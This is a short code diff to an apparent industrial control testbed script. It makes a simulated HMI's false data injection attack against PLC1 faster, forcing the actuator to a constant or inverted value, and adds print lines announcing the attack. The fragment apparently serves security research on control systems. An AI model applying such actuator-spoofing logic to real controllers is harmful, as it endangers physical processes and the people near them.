@@ -48,15 +48,19 @@ class FPHMI(HMI):
                 """
 
                 toggle_status = 1
+                print("Acutal status:", motor_status)
+                print("Attacking PLC1 with false data injection constant value: ", toggle_status)
                 self.set(ACTUATOR1, toggle_status)
                 self.send(ACTUATOR1, toggle_status, PLC1_ADDR) # this wont prolly do anything (Just to be safe)
-                time.sleep(20)
+                time.sleep(0.5)
                 logging.info("FDI Constant: Actuator status changed to: %s" % toggle_status)
             else:
                 toggle_status = int(not motor_status)
+                print("Acutal status:", motor_status)
+                print("Attacking PLC1 with false data injection not value: ", toggle_status)
                 self.set(ACTUATOR1, toggle_status)
                 self.send(ACTUATOR1, toggle_status, PLC1_ADDR) # this wont prolly do anything (Just to be safe)
-                time.sleep(20)
+                time.sleep(0.5)
                 logging.info("FDI toggle: Actuator status changed to %s" % toggle_status)
 
 
